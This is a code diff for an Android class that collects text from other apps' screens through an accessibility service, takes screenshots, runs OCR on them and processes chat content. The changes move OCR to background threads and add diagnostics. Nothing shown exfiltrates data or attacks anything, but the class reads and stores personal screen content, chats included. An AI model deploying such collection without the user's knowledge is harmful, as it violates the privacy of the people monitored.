@@ -22,8 +22,11 @@ import com.datacollector.android.utils.OcrProcessor;
 import com.datacollector.android.utils.ScreenshotCapture;
 import com.datacollector.android.utils.ScreenshotManager;
 import com.datacollector.android.utils.PowerOptimizer;
+import com.datacollector.android.utils.ScreenContentMonitor;
 
 import java.util.concurrent.ConcurrentLinkedQueue;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.List;
 
 /**
@@ -48,6 +51,7 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
     private Context context;
     private ConcurrentLinkedQueue<ScreenContentData> screenQueue;
     private Handler screenHandler;
+    private Handler backgroundHandler;
     private Runnable screenMonitorRunnable;
     private boolean isCollecting = false;
     
@@ -56,8 +60,12 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
     private ScreenshotCapture screenshotCapture;
     private ScreenshotManager screenshotManager;
     private PowerOptimizer powerOptimizer;
+    private ScreenContentMonitor contentMonitor;
     private long lastOcrTime = 0;
     private boolean isOcrProcessing = false;
+    
+    // 后台线程池用于OCR处理
+    private ExecutorService ocrExecutor;
     
     // 动态配置参数
     private int currentOcrInterval = OCR_INTERVAL;
@@ -74,6 +82,21 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
         this.screenQueue = new ConcurrentLinkedQueue<>();
         this.screenHandler = new Handler(Looper.getMainLooper());
         
+        // 创建后台线程Handler用于OCR处理
+        android.os.HandlerThread backgroundThread = new android.os.HandlerThread("ScreenContentCollector-Background");
+        backgroundThread.start();
+        this.backgroundHandler = new Handler(backgroundThread.getLooper());
+        
+        // 创建OCR处理线程池
+        this.ocrExecutor = Executors.newSingleThreadExecutor(r -> {
+            Thread t = new Thread(r, "OCR-Processor");
+            t.setDaemon(true);
+            return t;
+        });
+        
+        // 初始化监控工具
+        this.contentMonitor = new ScreenContentMonitor(context);
+        
         // 初始化OCR处理器
         if (ENABLE_OCR) {
             try {
@@ -84,6 +107,9 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
                 Log.d(TAG, "OCR功能已启用，包含优化组件");
             } catch (Exception e) {
                 Log.e(TAG, "OCR初始化失败", e);
+                if (contentMonitor != null) {
+                    contentMonitor.recordOcrFailure("OCR初始化失败: " + e.getMessage());
+                }
             }
         }
         
@@ -153,6 +179,12 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
      */
     private void captureScreenContent() {
         try {
+            // 过滤掉launcher自身的数据，避免干扰分析
+            if ("com.datacollector.android".equals(currentAppPackage)) {
+                Log.d(TAG, "跳过launcher自身屏幕内容收集，避免分析干扰");
+                return;
+            }
+            
             // 获取屏幕文本内容（无障碍服务）
             String currentContent = extractScreenText();
             
@@ -204,63 +236,118 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
     }
     
     /**
-     * 对屏幕进行OCR处理
+     * 对屏幕进行OCR处理（改进版，使用后台线程）
      */
     private void performOcrOnScreen(ScreenContentData screenData) {
         isOcrProcessing = true;
         lastOcrTime = System.currentTimeMillis();
         
-        // 尝试截图并进行OCR
-        if (context instanceof Activity) {
-            // 如果是Activity上下文，可以截图
-            Activity activity = (Activity) context;
-            android.view.View rootView = activity.findViewById(android.R.id.content);
-            
-            screenshotCapture.captureView(rootView, new ScreenshotCapture.ScreenshotCallback() {
-                @Override
-                public void onSuccess(Bitmap bitmap, String filePath) {
-                    // 对截图进行OCR识别
-                    ocrProcessor.recognizeTextFromBitmap(bitmap, new OcrProcessor.OcrCallback() {
-                        @Override
-                        public void onSuccess(String recognizedText, float confidence) {
-                            // OCR成功，更新屏幕数据
-                            screenData.ocrText = recognizedText;
-                            screenData.ocrConfidence = confidence;
-                            screenData.hasOcrData = true;
-                            screenData.screenshotPath = filePath;
-                            screenData.screenshot = bitmap; // 临时存储
+        // 在后台线程中执行OCR处理，避免阻塞主线程
+        ocrExecutor.execute(() -> {
+            try {
+                // 尝试截图并进行OCR
+                if (context instanceof Activity) {
+                    // 如果是Activity上下文，可以截图
+                    Activity activity = (Activity) context;
+                    android.view.View rootView = activity.findViewById(android.R.id.content);
+                    
+                    // 在主线程中获取View截图
+                    screenHandler.post(() -> {
+                        screenshotCapture.captureView(rootView, new ScreenshotCapture.ScreenshotCallback() {
+                            @Override
+                            public void onSuccess(Bitmap bitmap, String filePath) {
+                                // 在后台线程中进行OCR识别
+                                ocrExecutor.execute(() -> {
+                                    try {
+                                        ocrProcessor.recognizeTextFromBitmap(bitmap, new OcrProcessor.OcrCallback() {
+                                            @Override
+                                            public void onSuccess(String recognizedText, float confidence) {
+                                                // OCR成功，更新屏幕数据
+                                                screenData.ocrText = recognizedText;
+                                                screenData.ocrConfidence = confidence;
+                                                screenData.hasOcrData = true;
+                                                screenData.screenshotPath = filePath;
+                                                
+                                                // 记录OCR成功
+                                                if (contentMonitor != null) {
+                                                    contentMonitor.recordOcrSuccess();
+                                                }
+                                                
+                                                // 及时回收Bitmap，避免内存泄漏
+                                                if (bitmap != null && !bitmap.isRecycled()) {
+                                                    bitmap.recycle();
+                                                }
+                                                
+                                                Log.d(TAG, String.format("OCR识别成功: 置信度=%.2f, 文本长度=%d", 
+                                                    confidence, recognizedText.length()));
+                                                
+                                                // 在主线程中处理完成的屏幕数据
+                                                screenHandler.post(() -> {
+                                                    processScreenData(screenData);
+                                                    isOcrProcessing = false;
+                                                });
+                                            }
+                                            
+                                            @Override
+                                            public void onError(String error) {
+                                                Log.w(TAG, "OCR识别失败: " + error);
+                                                
+                                                // 记录OCR失败
+                                                if (contentMonitor != null) {
+                                                    contentMonitor.recordOcrFailure(error);
+                                                }
+                                                
+                                                // 及时回收Bitmap
+                                                if (bitmap != null && !bitmap.isRecycled()) {
+                                                    bitmap.recycle();
+                                                }
+                                                
+                                                // OCR失败，仍然保存无障碍服务的数据
+                                                screenHandler.post(() -> {
+                                                    processScreenData(screenData);
+                                                    isOcrProcessing = false;
+                                                });
+                                            }
+                                        });
+                                    } catch (Exception e) {
+                                        Log.e(TAG, "OCR处理异常", e);
+                                        if (bitmap != null && !bitmap.isRecycled()) {
+                                            bitmap.recycle();
+                                        }
+                                        screenHandler.post(() -> {
+                                            processScreenData(screenData);
+                                            isOcrProcessing = false;
+                                        });
+                                    }
+                                });
+                            }
                             
-                            Log.d(TAG, String.format("OCR识别成功: 置信度=%.2f, 文本长度=%d", 
-                                confidence, recognizedText.length()));
-                            
-                            // 处理完成的屏幕数据
-                            processScreenData(screenData);
-                            isOcrProcessing = false;
-                        }
-                        
-                        @Override
-                        public void onError(String error) {
-                            Log.w(TAG, "OCR识别失败: " + error);
-                            // OCR失败，仍然保存无障碍服务的数据
-                            processScreenData(screenData);
-                            isOcrProcessing = false;
-                        }
+                            @Override
+                            public void onError(String error) {
+                                Log.w(TAG, "截图失败: " + error);
+                                // 截图失败，直接处理无障碍服务的数据
+                                screenHandler.post(() -> {
+                                    processScreenData(screenData);
+                                    isOcrProcessing = false;
+                                });
+                            }
+                        });
+                    });
+                } else {
+                    // 非Activity上下文，无法截图，直接处理数据
+                    screenHandler.post(() -> {
+                        processScreenData(screenData);
+                        isOcrProcessing = false;
                     });
                 }
-                
-                @Override
-                public void onError(String error) {
-                    Log.w(TAG, "截图失败: " + error);
-                    // 截图失败，直接处理无障碍服务的数据
+            } catch (Exception e) {
+                Log.e(TAG, "OCR处理流程异常", e);
+                screenHandler.post(() -> {
                     processScreenData(screenData);
                     isOcrProcessing = false;
-                }
-            });
-        } else {
-            // 非Activity上下文，无法截图，直接处理数据
-            processScreenData(screenData);
-            isOcrProcessing = false;
-        }
+                });
+            }
+        });
     }
     
     /**
@@ -735,6 +822,51 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
     }
     
     /**
+     * 获取屏幕内容收集诊断报告
+     */
+    public JSONObject getDiagnosticReport() {
+        if (contentMonitor != null) {
+            return contentMonitor.getDiagnosticReport();
+        }
+        
+        // 返回基本状态信息
+        JSONObject basicReport = new JSONObject();
+        try {
+            basicReport.put("monitor_available", false);
+            basicReport.put("collecting", isCollecting);
+            basicReport.put("queue_size", getQueueSize());
+            basicReport.put("ocr_enabled", ENABLE_OCR);
+            basicReport.put("ocr_processing", isOcrProcessing);
+        } catch (JSONException e) {
+            Log.e(TAG, "创建基本诊断报告时出错", e);
+        }
+        
+        return basicReport;
+    }
+    
+    /**
+     * 检查收集器健康状态
+     */
+    public boolean isHealthy() {
+        if (contentMonitor != null) {
+            return contentMonitor.isHealthy();
+        }
+        
+        // 基本健康检查
+        return isCollecting && AccessibilityDataService.isServiceConnected();
+    }
+    
+    /**
+     * 重置统计数据
+     */
+    public void resetStatistics() {
+        if (contentMonitor != null) {
+            contentMonitor.resetStatistics();
+        }
+        Log.i(TAG, "ScreenContentCollector统计数据已重置");
+    }
+    
+    /**
      * 处理聊天内容（特殊处理）
      */
     private String processChatContent(String content) {
@@ -749,6 +881,11 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
     @Override
     public void onScreenContentChanged(String content, String packageName) {
         if (!isCollecting) return;
+        
+        // 记录无障碍事件
+        if (contentMonitor != null) {
+            contentMonitor.recordAccessibilityEvent();
+        }
         
         currentAppPackage = packageName;
         
@@ -794,6 +931,25 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
     public void release() {
         stopCollection();
         
+        // 停止后台线程池
+        if (ocrExecutor != null && !ocrExecutor.isShutdown()) {
+            ocrExecutor.shutdown();
+            try {
+                if (!ocrExecutor.awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS)) {
+                    ocrExecutor.shutdownNow();
+                }
+            } catch (InterruptedException e) {
+                ocrExecutor.shutdownNow();
+            }
+            ocrExecutor = null;
+        }
+        
+        // 停止后台Handler线程
+        if (backgroundHandler != null) {
+            backgroundHandler.getLooper().quit();
+            backgroundHandler = null;
+        }
+        
         // 释放OCR相关资源
         if (ocrProcessor != null) {
             ocrProcessor.release();
@@ -813,6 +969,21 @@ public class ScreenContentCollector implements AccessibilityDataService.ScreenCo
         // PowerOptimizer不需要特殊释放，置空即可
         powerOptimizer = null;
         
+        // 清理队列中的Bitmap资源
+        clearQueueBitmaps();
+        
         Log.d(TAG, "ScreenContentCollector resources released");
+    }
+    
+    /**
+     * 清理队列中的Bitmap资源
+     */
+    private void clearQueueBitmaps() {
+        for (ScreenContentData data : screenQueue) {
+            if (data.screenshot != null && !data.screenshot.isRecycled()) {
+                data.screenshot.recycle();
+                data.screenshot = null;
+            }
+        }
     }
 } 
